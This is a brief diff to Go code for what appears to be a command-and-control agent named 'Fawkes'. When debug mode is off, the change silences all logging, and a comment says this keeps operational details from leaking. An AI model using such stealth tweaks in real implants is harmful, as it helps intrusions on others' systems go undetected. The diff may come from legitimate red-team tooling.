@@ -5,6 +5,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"math/rand"
 	"net"
@@ -117,10 +118,11 @@ func runAgent() {
 		debugBool = false
 	}
 
-	// Setup logging
+	// Setup logging — suppress all output in production to avoid leaking operational details to stderr
 	if debugBool {
 		log.SetOutput(os.Stdout)
-		// log.Println("[DEBUG] Starting Fawkes agent")
+	} else {
+		log.SetOutput(io.Discard)
 	}
 
 	// Verify required configuration
